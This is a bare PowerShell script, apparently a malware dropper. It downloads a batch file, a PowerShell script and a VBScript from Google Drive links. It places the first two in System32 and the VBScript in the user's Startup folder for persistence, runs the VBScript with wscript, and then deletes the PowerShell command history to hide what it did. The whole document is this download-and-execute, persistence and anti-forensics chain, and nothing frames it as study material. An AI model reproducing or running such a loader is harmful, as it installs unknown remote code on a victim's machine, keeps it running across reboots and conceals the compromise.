cd "$env:USERPROFILE"
Invoke-WebRequest -Uri "https://drive.google.com/uc?export=download&id=1bVch_eQP-2QiQllrW5VKCDm0u9p-nJ5I" -OutFile "win64.bat"
Invoke-WebRequest -Uri "https://drive.google.com/uc?export=download&id=1xejGhEY1YxEJNanzlceGfv9SVNdGpDEg" -OutFile "user.ps1"
Move-Item "$env:USERPROFILE\win64.bat" "$env:windir\System32\win64.bat" -Force
Move-Item "$env:USERPROFILE\user.ps1" "$env:windir\System32\user.ps1" -Force
$startupPath = [Environment]::GetFolderPath("Startup")
cd $startupPath
Invoke-WebRequest -Uri "https://drive.google.com/uc?export=download&id=1CFXj6nXlHgFJRzJfabJeIBypEQC_elef" -OutFile "startup.vbs"
Start-Process "wscript.exe" -ArgumentList "startup.vbs"
Remove-Item (Get-PSReadlineOption).HistorySavePath -ErrorAction SilentlyContinue
exit
